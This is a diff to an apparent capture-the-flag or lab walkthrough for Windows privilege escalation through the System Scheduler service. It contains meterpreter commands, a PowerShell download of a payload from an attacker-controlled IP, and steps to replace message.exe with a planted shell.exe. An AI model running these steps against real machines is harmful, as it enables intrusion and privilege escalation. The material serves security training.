@@ -535,7 +535,16 @@ meterpreter >
 run simple server again use the shell.exe 
 meterpreter> shell
 c:\Program Files (x86)\systemscheduler\> powershell -c "Invoke-WebRequest -Uri 'http://10.146.85.223:8000/winPEAS.bat' -Outfile 'c:\program files (x86)\systemscheduler\events\shell.exe'
-then
+
+or first run to get powershell prompt: 
+```
+meterpreter > load powershell
+Loading extension powershell...Success.
+meterpreter > powershell_shell
+```
+Then enter powershell commands from powershell prompt, but here this is not easier.
+
+Next replace the message.exe file:
 rename message.exe message.bak
 rename shell.exe message.exe
 
